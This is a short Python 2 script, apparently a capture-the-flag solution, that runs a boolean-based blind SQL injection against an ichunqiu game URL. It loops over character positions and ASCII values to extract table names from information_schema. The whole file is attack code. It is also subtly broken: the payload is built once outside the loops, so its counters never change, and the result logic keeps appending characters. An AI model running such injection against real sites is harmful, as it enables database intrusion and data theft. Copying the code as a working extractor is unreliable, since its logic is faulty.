import urllib
import urllib2
a=1
b=1
s=32
url = 'http://9cab2b086fc642ebbcf9b68ab8781d8afc9df7141dec4a7d.game.ichunqiu.com/index.php?id=-1'
payload_table_name = ' or (select ascii(substr((select table_name from information_schema.tables where table_schema like 0x696e666f726d6174696f6e5f736368656d61 limit 0,1),'+str(a)+','+str(b)+')))>'+str(s)
res = ""
while(b<13):
    while (a<20):
        print a 
        s=32
        while (s<128):
            dst = url+payload_table_name
            req = urllib2.Request(dst)
            response = urllib2.urlopen(req)
            the_page = response.read()
            print s
            if (the_page.find("Hello Hacker!! ")>0):
                c = s + 1  
                res = res + chr(c)
                print res
            s+=1
        a+=1
    b+=1